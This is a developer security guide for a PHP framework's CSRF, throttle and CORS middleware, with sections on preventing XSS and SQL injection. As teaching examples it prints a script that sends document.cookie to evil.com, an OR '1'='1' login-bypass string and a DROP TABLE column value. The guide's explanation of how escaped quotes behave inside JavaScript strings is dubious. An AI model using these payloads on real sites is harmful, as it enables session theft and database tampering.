# Developer Security Guide: CSRF, Rate Limiting & CORS

**SO Framework** | **Middleware Security** | **Step-by-Step Guide**

A hands-on guide to configuring and using the three core security middleware in the SO Backend Framework: CSRF protection, rate limiting (throttle), and CORS.

---

## Table of Contents

1. [Overview](#overview)
2. [CSRF Protection](#csrf-protection)
3. [Rate Limiting](#rate-limiting)
4. [CORS](#cors)
5. [XSS Prevention](#xss-prevention)
6. [SQL Injection Prevention](#sql-injection-prevention)
7. [Combining Security Middleware](#combining-security-middleware)
8. [Complete Example](#complete-example)

---

## Overview

The SO Backend Framework ships with three middleware classes that guard your application at the HTTP layer. Each one addresses a different attack surface:

| Middleware | Class | Purpose |
|---|---|---|
| **CSRF** | `App\Middleware\CsrfMiddleware` | Prevents cross-site request forgery on state-changing requests |
| **Throttle** | `App\Middleware\ThrottleMiddleware` | Enforces per-user / per-IP rate limits to stop abuse |
| **CORS** | `App\Middleware\CorsMiddleware` | Controls which external origins may call your API |

All three implement `Core\Middleware\MiddlewareInterface` and follow the same `handle(Request $request, callable $next)` contract, so they can be stacked freely in route groups.

### Request Lifecycle

```
Incoming Request
      |
CsrfMiddleware   -->  validates token on POST/PUT/DELETE/PATCH
      |
ThrottleMiddleware --> checks rate limit counter
      |
CorsMiddleware   -->  handles preflight, adds CORS headers
      |
Your Controller
      |
Response (with rate-limit and CORS headers attached)
```

---

## CSRF Protection

### How It Works

`CsrfMiddleware` intercepts every request and applies the following logic:

1. **Skip safe methods** -- GET, HEAD, and OPTIONS requests pass through immediately because they should not change server state.
2. **Skip excluded routes** -- Routes listed in `config/security.php` under `csrf.except` (e.g. `api/*`, `webhooks/*`) are not checked. Wildcards are supported.
3. **Extract the token** -- The middleware looks for the token in two places, in order:
   - The `_token` POST field (`$request->input('_token')`)
   - The `X-CSRF-TOKEN` HTTP header (`$request->header('X-CSRF-TOKEN')`)
4. **Verify** -- The token is compared against the session-stored token using `hash_equals()` (timing-safe). A mismatch returns a `419` status for JSON consumers or redirects back with an error flash for web requests.

### Using `csrf_field()` in Forms

The `csrf_field()` helper generates a hidden input that contains the current session token. Place it inside every HTML form that uses POST, PUT, DELETE, or PATCH:

```php
<form method="POST" action="/dashboard/users">
    <?= csrf_field() ?>

    <label for="name">Name</label>
    <input type="text" id="name" name="name" required>

    <label for="email">Email</label>
    <input type="email" id="email" name="email" required>

    <button type="submit">Create User</button>
</form>
```

The helper renders:

```html
<input type="hidden" name="_token" value="a3f5c9...64-hex-chars...">
```

If you need only the raw token value (for example, to embed it in a JavaScript variable), use `csrf_token()` instead:

```php
<meta name="csrf-token" content="<?= csrf_token() ?>">
```

### Sending the Token via AJAX (X-CSRF-TOKEN Header)

For JavaScript-driven requests, read the token from the meta tag and send it as a header. The middleware checks `X-CSRF-TOKEN` when no `_token` POST field is present:

```php
<script>
    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

    // Using fetch
    fetch('/dashboard/users', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': csrfToken
        },
        body: JSON.stringify({ name: 'Jane', email: 'jane@example.com' })
    });

    // Using XMLHttpRequest
    const xhr = new XMLHttpRequest();
    xhr.open('POST', '/dashboard/users');
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.setRequestHeader('X-CSRF-TOKEN', csrfToken);
    xhr.send(JSON.stringify({ name: 'Jane', email: 'jane@example.com' }));
</script>
```

### Excluding Routes from CSRF Verification

Some endpoints -- webhooks from third-party services, for example -- cannot supply a CSRF token. Exclude them by adding wildcard patterns to `config/security.php`:

```php
// config/security.php

return [
    'csrf' => [
        'enabled' => env('CSRF_ENABLED', true),

        'except' => [
            'api/*',          // All API routes (typically JWT-protected instead)
            'webhooks/*',     // Incoming webhook callbacks
            'stripe/webhook', // Specific route
        ],
    ],

    // ... jwt, rate_limit sections ...
];
```

The `Csrf::isExcluded()` method converts each pattern to a regex (`*` becomes `.*`), so `api/*` matches `api/users`, `api/invoices/123`, and so on.

### Regenerating the Token

After sensitive operations such as login, regenerate the CSRF token to prevent session fixation:

```php
use Core\Security\Csrf;

public function login(Request $request): Response
{
    // ... authenticate user ...

    // Regenerate CSRF token after successful login
    Csrf::regenerate();

    return redirect('/dashboard');
}
```

---

## Rate Limiting

### ThrottleMiddleware with Parameters

`ThrottleMiddleware` uses the colon syntax to receive its configuration inline when it is attached to a route group. The format is:

```
ThrottleMiddleware::class . ':maxAttempts,decayMinutes'
```

- **maxAttempts** -- the maximum number of requests allowed within the window.
- **decayMinutes** -- the length of the sliding window in minutes (defaults to `1` if omitted).

```php
use App\Middleware\ThrottleMiddleware;

// 60 requests per 1 minute (the framework default)
Router::group(['middleware' => [ThrottleMiddleware::class . ':60,1']], function () {
    Router::get('/api/products', [ProductController::class, 'index']);
});

// 10 requests per 1 minute (strict, for contact forms)
Router::group(['middleware' => [ThrottleMiddleware::class . ':10,1']], function () {
    Router::post('/api/contact', [ContactController::class, 'store']);
});

// 5 requests per 1 minute (very strict, for login)
Router::group(['middleware' => [ThrottleMiddleware::class . ':5,1']], function () {
    Router::post('/login', [AuthController::class, 'login']);
});

// 200 requests per 5 minutes
Router::group(['middleware' => [ThrottleMiddleware::class . ':200,5']], function () {
    Router::get('/api/search', [SearchController::class, 'index']);
});
```

When no parameters are supplied, the middleware reads the default from `config/security.php`:

```php
'rate_limit' => [
    'enabled' => env('RATE_LIMIT_ENABLED', true),
    'default' => env('RATE_LIMIT_DEFAULT', '60,1'),  // 60 requests per 1 minute
],
```

### How Rate Limit Keys Work

The middleware generates a unique key per consumer so that one user's traffic does not count against another's:

| User State | Key Format | Example |
|---|---|---|
| Authenticated | `user:{id}` | `user:42` |
| Guest | `ip:{address}` | `ip:203.0.113.55` |

The key resolution logic in `ThrottleMiddleware::resolveRequestSignature()` checks `auth()->id()` first. If the user is logged in, the key is bound to their user ID. Otherwise the client's IP address is used, with support for `X-Forwarded-For` and `X-Real-IP` headers when the application sits behind a proxy or load balancer.

Internally the key is stored in the cache backend via `Core\Security\RateLimiter`, which prefixes it with `rate_limit:` (e.g. `rate_limit:user:42`). A separate timeout key (`rate_limit:user:42:timeout`) tracks when the window expires.

### Response Headers

Every response that passes through `ThrottleMiddleware` includes informational headers so clients can track their quota:

| Header | Description | Example Value |
|---|---|---|
| `X-RateLimit-Limit` | Maximum requests allowed in the window | `60` |
| `X-RateLimit-Remaining` | Requests left before throttling | `57` |
| `Retry-After` | Seconds until the window resets (only when limit exceeded) | `34` |
| `X-RateLimit-Reset` | Unix timestamp when the window resets (only when limit exceeded) | `1706650000` |

### Handling 429 Too Many Requests

When a client exhausts its quota, the middleware returns a `429` response. The body format depends on the request type:

- **API / JSON requests** -- `JsonResponse::error('Too many requests. Please try again later.', 429)`
- **Web requests** -- `new Response('Too many requests. Please try again later.', 429)`

Both include the rate-limit headers described above.

Clients should read the `Retry-After` header and back off accordingly:

```php
// Client-side handling example (JavaScript)
fetch('/api/products')
    .then(response => {
        if (response.status === 429) {
            const retryAfter = response.headers.get('Retry-After');
            console.log(`Rate limited. Retry in ${retryAfter} seconds.`);
            // Retry after the specified delay
            setTimeout(() => { /* retry the request */ }, retryAfter * 1000);
        }
    });
```

---

## CORS

### CorsMiddleware Setup

`CorsMiddleware` serves two purposes:

1. **Preflight handling** -- When the browser sends an `OPTIONS` request before a cross-origin call, the middleware responds immediately with the appropriate `Access-Control-*` headers and a `200` status. The request never reaches your controller.
2. **Header injection** -- For all other requests, it appends the CORS headers to the response so the browser permits the cross-origin read.

Apply it to any route group that needs to be accessible from a different origin:

```php
use App\Middleware\CorsMiddleware;

Router::group([
    'prefix' => 'api/v1',
    'middleware' => [CorsMiddleware::class]
], function () {
    Router::get('/products', [ProductController::class, 'index']);
    Router::post('/products', [ProductController::class, 'store']);
});
```

### Configuration Options

CORS behavior is driven by `config/cors.php`. If this file does not exist, the middleware falls back to sensible defaults. Create or edit the file with the following keys:

```php
<?php

// config/cors.php

return [
    /*
    |--------------------------------------------------------------------------
    | Allowed Origins
    |--------------------------------------------------------------------------
    |
    | Domains permitted to make cross-origin requests.
    | Use ['*'] to allow any origin (not recommended for production).
    | Wildcard subdomains are supported: '*.example.com'
    |
    */
    'allowed_origins' => [
        'https://app.example.com',
        'https://admin.example.com',
        'https://*.example.com',   // wildcard subdomain
    ],

    /*
    |--------------------------------------------------------------------------
    | Allowed Methods
    |--------------------------------------------------------------------------
    |
    | HTTP methods permitted for cross-origin requests.
    | Comma-separated string.
    |
    */
    'allowed_methods' => 'GET,POST,PUT,DELETE,PATCH,OPTIONS',

    /*
    |--------------------------------------------------------------------------
    | Allowed Headers
    |--------------------------------------------------------------------------
    |
    | Request headers the client is allowed to send.
    | Comma-separated string.
    |
    */
    'allowed_headers' => 'Content-Type,Authorization,X-CSRF-TOKEN,X-Requested-With',

    /*
    |--------------------------------------------------------------------------
    | Exposed Headers
    |--------------------------------------------------------------------------
    |
    | Response headers the browser is allowed to read.
    | Set to null if none need to be exposed.
    |
    */
    'exposed_headers' => 'X-RateLimit-Limit,X-RateLimit-Remaining,Retry-After',

    /*
    |--------------------------------------------------------------------------
    | Allow Credentials
    |--------------------------------------------------------------------------
    |
    | Whether cookies and Authorization headers should be included.
    | When true, allowed_origins MUST NOT be ['*'].
    |
    */
    'allow_credentials' => false,

    /*
    |--------------------------------------------------------------------------
    | Max Age
    |--------------------------------------------------------------------------
    |
    | How long (in seconds) the browser should cache preflight results.
    | Default is 86400 (24 hours).
    |
    */
    'max_age' => '86400',
];
```

### Preflight Handling

When the browser sends a preflight `OPTIONS` request, `CorsMiddleware` short-circuits the pipeline:

```
Browser                        Server
  |                              |
  |--- OPTIONS /api/products --> |
  |    Origin: https://app.com   |
  |    Access-Control-Request-   |
  |      Method: POST            |
  |                              |
  |  <-- 200 OK --------------- |
  |   Access-Control-Allow-      |
  |     Origin: https://app.com  |
  |   Access-Control-Allow-      |
  |     Methods: GET,POST,...    |
  |   Access-Control-Allow-      |
  |     Headers: Content-Type,...|
  |   Access-Control-Max-Age:    |
  |     86400                    |
  |                              |
  |--- POST /api/products ----> |
  |    (actual request)          |
```

The middleware checks the `Origin` header against `allowed_origins`. It supports exact matches, wildcard (`*` for any origin), and wildcard subdomains (`*.example.com`). If the origin is permitted, it is reflected back in `Access-Control-Allow-Origin`. If not, the header is omitted and the browser blocks the response.

---

## XSS Prevention

### What is XSS?

Cross-Site Scripting (XSS) occurs when an attacker injects malicious JavaScript into your application's output, which then executes in other users' browsers. This can steal session cookies, redirect users to phishing sites, or modify page content.

**Example Attack:**

A user submits a comment containing:

```html
<script>
    // Steal session cookie and send to attacker
    fetch('https://evil.com/steal?cookie=' + document.cookie);
</script>
```

If you render this comment without escaping, the script executes in every visitor's browser.

### How the Framework Prevents XSS

The SO Framework provides the `e()` helper function (short for "escape") that converts special HTML characters into their entity equivalents, preventing browsers from interpreting them as code.

| Character | Converted To | Why |
|-----------|--------------|-----|
| `<` | `&lt;` | Prevents opening tags |
| `>` | `&gt;` | Prevents closing tags |
| `&` | `&amp;` | Prevents entity injection |
| `"` | `&quot;` | Prevents breaking attributes |
| `'` | `&#039;` | Prevents breaking attributes |

### Using e() to Escape Output

**Always** escape user-generated content when rendering it in views:

```php
<!-- Vulnerable (NEVER do this) -->
<h1>Welcome, <?= $userName ?></h1>

<!-- Safe (ALWAYS do this) -->
<h1>Welcome, <?= e($userName) ?></h1>
```

**Example with Malicious Input:**

```php
$userName = '<script>alert("XSS")</script>';
```

**Without escaping:**
```html
<h1>Welcome, <script>alert("XSS")</script></h1>
```
Result: The alert executes.

**With escaping:**
```html
<h1>Welcome, &lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</h1>
```
Result: The browser displays the literal text `<script>alert("XSS")</script>` -- the script does not execute.

### When to Use e()

Escape **every** variable that contains user-generated or database-stored content:

```php
<!-- User names and emails -->
<p>Email: <?= e($user->email) ?></p>

<!-- Form input values -->
<input type="text" name="name" value="<?= e(old('name')) ?>">

<!-- Database content -->
<p><?= e($comment->body) ?></p>

<!-- Query string parameters -->
<p>Search: <?= e($request->input('q')) ?></p>

<!-- URL parameters -->
<a href="/users/<?= e($userId) ?>"><?= e($userName) ?></a>
```

### When NOT to Use e()

Do **not** escape HTML that you intentionally want to render (trusted content only):

```php
<!-- Markdown or rich text from a trusted admin -->
<?php
$adminContent = parseMarkdown($post->body); // Returns safe HTML
echo $adminContent; // Safe because admin is trusted and content is sanitized
?>
```

**Warning:** Only skip escaping for content from **trusted sources** that has been **sanitized** by a library like HTMLPurifier or Markdown parser.

### Escaping in Different Contexts

**HTML Attributes:**

```php
<div class="user-<?= e($userRole) ?>">
<img src="<?= e($imageUrl) ?>" alt="<?= e($imageAlt) ?>">
```

**JavaScript Strings:**

For embedding PHP variables in JavaScript, use `json_encode()` instead of `e()`:

```php
<script>
    const userName = <?= json_encode($user->name) ?>;
    const userData = <?= json_encode($user->toArray()) ?>;
</script>
```

**Never** do this:

```php
<!-- VULNERABLE -->
<script>
    const userName = "<?= e($user->name) ?>";
</script>
```

If `$user->name` is `"; alert('XSS'); "`, the result is:

```javascript
const userName = "&quot;; alert('XSS'); &quot;";
```

This still executes because `&quot;` is decoded by the browser before JavaScript parses it.

**URL Parameters:**

Use `urlencode()` for query strings:

```php
<a href="/search?q=<?= urlencode($searchTerm) ?>">Search</a>
```

**CSS:**

Avoid embedding user content in CSS. If you must:

```php
<style>
    .user-color {
        color: <?= preg_match('/^#[0-9A-Fa-f]{6}$/', $color) ? $color : '#000000' ?>;
    }
</style>
```

Validate the input format before outputting.

### Content Security Policy (CSP)

For extra protection, add a Content Security Policy header to block inline scripts:

```php
// In a middleware or controller
public function handle(Request $request, Closure $next): Response
{
    $response = $next($request);

    $response->header('Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
    );

    return $response;
}
```

This prevents any `<script>` tags not loaded from your domain from executing, even if an XSS payload makes it through.

### Quick Reference: XSS Prevention Checklist

- **Always** use `e()` for user-generated content in HTML
- **Always** use `json_encode()` for PHP-to-JavaScript data
- **Always** use `urlencode()` for query string parameters
- **Always** validate and sanitize rich text/HTML from editors
- **Never** output raw user input directly into HTML
- **Never** trust data from forms, URLs, or databases without escaping

---

## SQL Injection Prevention

### What is SQL Injection?

SQL injection occurs when an attacker manipulates SQL queries by injecting malicious input through form fields, URL parameters, or other user inputs.

**Example Attack:**

```php
// VULNERABLE CODE (NEVER do this)
$email = $_POST['email'];
$sql = "SELECT * FROM users WHERE email = '{$email}'";
$result = $db->query($sql);
```

If an attacker submits:

```
email = admin@example.com' OR '1'='1
```

The query becomes:

```sql
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
```

This returns **all users** instead of one, because `'1'='1'` is always true.

### How the Framework Prevents SQL Injection

The SO Framework uses **parameterized queries** (prepared statements) throughout its database layer, which separates SQL code from user data.

### Always Use Query Builder or Models

The framework's Query Builder and Model classes automatically use parameterized queries:

**Safe (Query Builder):**

```php
use Core\Database\DB;

// WHERE clause with bindings
$users = DB::table('users')
    ->where('email', $request->input('email'))
    ->get();

// Multiple conditions
$posts = DB::table('posts')
    ->where('user_id', $userId)
    ->where('status', $status)
    ->get();
```

**Safe (Model):**

```php
use App\Models\User;

// Find by primary key
$user = User::find($request->input('id'));

// Find by attribute
$user = User::findBy('email', $request->input('email'));

// Where queries
$users = User::where('role', $request->input('role'))->get();
```

**Safe (Raw Query with Bindings):**

If you need raw SQL, always use parameter binding:

```php
$email = $request->input('email');

// Positional placeholders
$result = app('db')->connection->query(
    "SELECT * FROM users WHERE email = ? AND status = ?",
    [$email, 'active']
);

// Named placeholders
$result = app('db')->connection->query(
    "SELECT * FROM users WHERE email = :email AND status = :status",
    ['email' => $email, 'status' => 'active']
);
```

### Never Concatenate User Input into SQL

**NEVER do this:**

```php
// VULNERABLE - String concatenation
$sql = "SELECT * FROM users WHERE email = '{$request->input('email')}'";
$result = app('db')->connection->query($sql);

// VULNERABLE - String interpolation
$email = $request->input('email');
$sql = "SELECT * FROM users WHERE email = '{$email}'";
$result = app('db')->connection->query($sql);

// VULNERABLE - Building WHERE clauses manually
$filters = "status = '{$request->input('status')}'";
$sql = "SELECT * FROM users WHERE {$filters}";
```

### Validating Input Before Queries

Even with parameterized queries, always validate input to ensure it matches expected formats:

```php
use Core\Validation\Validator;

// Validate before querying
$validator = Validator::make($request->all(), [
    'id'     => 'required|integer',
    'email'  => 'required|email',
    'role'   => 'required|in:admin,user,moderator',
]);

if ($validator->fails()) {
    return redirect()->back()->withErrors($validator->errors());
}

// Now safe to use in queries
$user = User::find($request->input('id'));
```

### Safe Dynamic Column Names and Table Names

**Problem:** Query Builder only protects **values**, not column/table names.

**Vulnerable:**

```php
// User controls the column name - DANGEROUS
$column = $request->input('sort_by'); // Could be: "id; DROP TABLE users--"
$users = DB::table('users')->orderBy($column)->get();
```

**Solution:** Whitelist allowed columns:

```php
$sortBy = $request->input('sort_by', 'created_at');

$allowedColumns = ['name', 'email', 'created_at', 'status'];

if (!in_array($sortBy, $allowedColumns)) {
    $sortBy = 'created_at'; // Default
}

$users = DB::table('users')->orderBy($sortBy)->get();
```

### Safe LIKE Queries

When using `LIKE` with user input, escape wildcard characters:

```php
$search = $request->input('search');

// Escape special LIKE characters (%, _)
$escapedSearch = str_replace(['%', '_'], ['\%', '\_'], $search);

$users = DB::table('users')
    ->where('name', 'LIKE', "%{$escapedSearch}%")
    ->get();
```

The Query Builder still uses parameter binding for the value, but we manually escape wildcards to prevent unintended matching.

### Safe Dynamic Table Names (Advanced)

If you absolutely must use dynamic table names (rare), validate them:

```php
$tableName = $request->input('table');

// Whitelist approach
$allowedTables = ['users', 'posts', 'comments'];

if (!in_array($tableName, $allowedTables)) {
    throw new \InvalidArgumentException('Invalid table name');
}

$results = DB::table($tableName)->get();
```

Or use Schema validation:

```php
use Core\Database\Schema;

$tableName = $request->input('table');

if (!Schema::hasTable($tableName)) {
    throw new \InvalidArgumentException('Table does not exist');
}

$results = DB::table($tableName)->get();
```

### Quick Reference: SQL Injection Prevention Checklist

- **Always** use Query Builder or Models for database operations
- **Always** use parameterized queries for raw SQL (`?` or `:name` placeholders)
- **Always** validate user input before queries
- **Always** whitelist column names and table names if user-controlled
- **Always** escape wildcards in LIKE queries
- **Never** concatenate user input into SQL strings
- **Never** trust user input for column/table names without validation
- **Never** use `eval()` or dynamic SQL construction with user data

### Example: Safe Search Feature

**Complete safe search implementation:**

```php
use Core\Database\DB;
use Core\Validation\Validator;

public function search(Request $request): Response
{
    // 1. Validate input
    $validator = Validator::make($request->all(), [
        'query'   => 'required|string|max:100',
        'sort_by' => 'string|in:name,created_at,email',
        'status'  => 'string|in:active,inactive,banned',
    ]);

    if ($validator->fails()) {
        return redirect()->back()->withErrors($validator->errors());
    }

    // 2. Sanitize search term
    $query = $request->input('query');
    $escapedQuery = str_replace(['%', '_'], ['\%', '\_'], $query);

    // 3. Whitelist sort column
    $sortBy = $request->input('sort_by', 'created_at');
    $allowedSorts = ['name', 'created_at', 'email'];
    if (!in_array($sortBy, $allowedSorts)) {
        $sortBy = 'created_at';
    }

    // 4. Execute safe parameterized query
    $users = DB::table('users')
        ->where('name', 'LIKE', "%{$escapedQuery}%")
        ->where('status', $request->input('status', 'active'))
        ->orderBy($sortBy)
        ->limit(50)
        ->get();

    return Response::view('users/search', [
        'users' => $users,
        'query' => $query, // Original query for display (will be escaped by e() in view)
    ]);
}
```

**View template (safe output):**

```php
<h2>Search Results for "<?= e($query) ?>"</h2>

<ul>
    <?php foreach ($users as $user): ?>
        <li>
            <strong><?= e($user['name']) ?></strong>
            (<?= e($user['email']) ?>)
        </li>
    <?php endforeach; ?>
</ul>
```

---

## Combining Security Middleware

Middleware classes are stacked in the order they appear in the array. A typical pattern is to layer authentication, CSRF, and throttle together:

### Web Route Group (Auth + CSRF + Throttle)

```php
use Core\Routing\Router;
use App\Middleware\AuthMiddleware;
use App\Middleware\CsrfMiddleware;
use App\Middleware\ThrottleMiddleware;

Router::group([
    'prefix' => 'dashboard',
    'middleware' => [
        CsrfMiddleware::class,                     // 1. Verify CSRF token
        AuthMiddleware::class,                      // 2. Require login
        ThrottleMiddleware::class . ':60,1',        // 3. 60 req/min per user
    ]
], function () {
    Router::get('/', [DashboardController::class, 'index'])->name('dashboard');
    Router::post('/settings', [DashboardController::class, 'updateSettings'])->name('dashboard.settings');
    Router::delete('/users/{id}', [DashboardController::class, 'destroy'])->name('dashboard.users.destroy');
});
```

### API Route Group (CORS + Auth + Throttle)

```php
use App\Middleware\CorsMiddleware;
use App\Middleware\JwtMiddleware;
use App\Middleware\ThrottleMiddleware;

Router::group([
    'prefix' => 'api/v1',
    'middleware' => [
        CorsMiddleware::class,                     // 1. Handle preflight, add CORS headers
        JwtMiddleware::class,                      // 2. Validate Bearer token
        ThrottleMiddleware::class . ':100,1',       // 3. 100 req/min per user
    ]
], function () {
    Router::get('/invoices', [InvoiceController::class, 'index']);
    Router::post('/invoices', [InvoiceController::class, 'store']);
    Router::put('/invoices/{id}', [InvoiceController::class, 'update']);
    Router::delete('/invoices/{id}', [InvoiceController::class, 'destroy']);
});
```

### Nesting Middleware Groups

You can nest groups to apply different limits at different levels. The framework's `routes/web/auth.php` demonstrates this pattern -- an outer CSRF group wraps an inner throttle group:

```php
use App\Middleware\CsrfMiddleware;
use App\Middleware\GuestMiddleware;
use App\Middleware\ThrottleMiddleware;

Router::group(['middleware' => [CsrfMiddleware::class]], function () {

    Router::group(['middleware' => [GuestMiddleware::class]], function () {

        // Show forms (GET -- no throttle needed)
        Router::get('/login', [AuthController::class, 'showLogin'])->name('login');
        Router::get('/register', [AuthController::class, 'showRegister'])->name('register');

        // Strict throttle on login/register submissions
        Router::group(['middleware' => [ThrottleMiddleware::class . ':5,1']], function () {
            Router::post('/login', [AuthController::class, 'login'])->name('login.submit');
            Router::post('/register', [AuthController::class, 'register'])->name('register.submit');
        });
    });
});
```

---

## Complete Example

Below is a self-contained route file that combines all three security middleware in a realistic application layout.

### Secure API Group (JWT + Throttle + CORS)

```php
<?php
// routes/api/v1.php

use Core\Routing\Router;
use App\Controllers\Api\InvoiceController;
use App\Controllers\Api\ReportController;
use App\Middleware\CorsMiddleware;
use App\Middleware\JwtMiddleware;
use App\Middleware\ThrottleMiddleware;

// -----------------------------------------------
// Public API (CORS + generous throttle, no auth)
// -----------------------------------------------
Router::group([
    'prefix' => 'api/v1',
    'middleware' => [
        CorsMiddleware::class,
        ThrottleMiddleware::class . ':100,1',   // 100 req/min
    ]
], function () {
    Router::get('/status', function () {
        return json(['status' => 'ok', 'version' => '1.0']);
    })->name('api.status');
});

// -----------------------------------------------
// Authenticated API (CORS + JWT + strict throttle)
// -----------------------------------------------
Router::group([
    'prefix' => 'api/v1',
    'middleware' => [
        CorsMiddleware::class,
        JwtMiddleware::class,
        ThrottleMiddleware::class . ':60,1',    // 60 req/min per user
    ]
], function () {

    // Invoices CRUD
    Router::get('/invoices', [InvoiceController::class, 'index'])->name('api.invoices.index');
    Router::post('/invoices', [InvoiceController::class, 'store'])->name('api.invoices.store');
    Router::get('/invoices/{id}', [InvoiceController::class, 'show'])
        ->whereNumber('id')
        ->name('api.invoices.show');
    Router::put('/invoices/{id}', [InvoiceController::class, 'update'])
        ->whereNumber('id')
        ->name('api.invoices.update');
    Router::delete('/invoices/{id}', [InvoiceController::class, 'destroy'])
        ->whereNumber('id')
        ->name('api.invoices.destroy');

    // Reports (even stricter limit -- expensive queries)
    Router::group(['middleware' => [ThrottleMiddleware::class . ':10,1']], function () {
        Router::get('/reports/monthly', [ReportController::class, 'monthly'])->name('api.reports.monthly');
        Router::get('/reports/annual', [ReportController::class, 'annual'])->name('api.reports.annual');
    });
});
```

### Secure Web Form (CSRF + Auth + Throttle)

```php
<?php
// routes/web/invoices.php

use Core\Routing\Router;
use App\Controllers\InvoiceController;
use App\Middleware\AuthMiddleware;
use App\Middleware\CsrfMiddleware;
use App\Middleware\ThrottleMiddleware;

Router::group([
    'prefix' => 'invoices',
    'middleware' => [
        CsrfMiddleware::class,                  // Validate _token on POST/PUT/DELETE
        AuthMiddleware::class,                   // Require session login
        ThrottleMiddleware::class . ':60,1',     // 60 req/min
    ]
], function () {

    // List & show (GET -- CSRF skips these automatically)
    Router::get('/', [InvoiceController::class, 'index'])->name('invoices.index');
    Router::get('/create', [InvoiceController::class, 'create'])->name('invoices.create');
    Router::get('/{id}/edit', [InvoiceController::class, 'edit'])
        ->whereNumber('id')
        ->name('invoices.edit');

    // State-changing routes (CSRF token required)
    Router::post('/', [InvoiceController::class, 'store'])->name('invoices.store');
    Router::put('/{id}', [InvoiceController::class, 'update'])
        ->whereNumber('id')
        ->name('invoices.update');
    Router::delete('/{id}', [InvoiceController::class, 'destroy'])
        ->whereNumber('id')
        ->name('invoices.destroy');
});
```

The corresponding form view includes `csrf_field()` and uses the `X-CSRF-TOKEN` header for the inline delete button:

```php
<!-- resources/views/invoices/create.php -->

<form method="POST" action="<?= route('invoices.store') ?>">
    <?= csrf_field() ?>

    <label for="number">Invoice Number</label>
    <input type="text" id="number" name="number" value="<?= e(old('number')) ?>" required>

    <label for="amount">Amount</label>
    <input type="number" id="amount" name="amount" step="0.01" required>

    <label for="due_date">Due Date</label>
    <input type="date" id="due_date" name="due_date" required>

    <button type="submit">Create Invoice</button>
</form>

<!-- Delete button using AJAX with CSRF header -->
<meta name="csrf-token" content="<?= csrf_token() ?>">

<script>
function deleteInvoice(id) {
    if (!confirm('Delete this invoice?')) return;

    const token = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

    fetch('/invoices/' + id, {
        method: 'DELETE',
        headers: {
            'X-CSRF-TOKEN': token,
            'Accept': 'application/json'
        }
    })
    .then(response => {
        if (response.status === 429) {
            const retry = response.headers.get('Retry-After');
            alert('Too many requests. Please wait ' + retry + ' seconds.');
            return;
        }
        if (response.ok) {
            window.location.reload();
        }
    });
}
</script>
```

---

**Documentation Version**: 1.0
**Last Updated**: 2026-01-30
**Maintained By**: SO Backend Framework Team
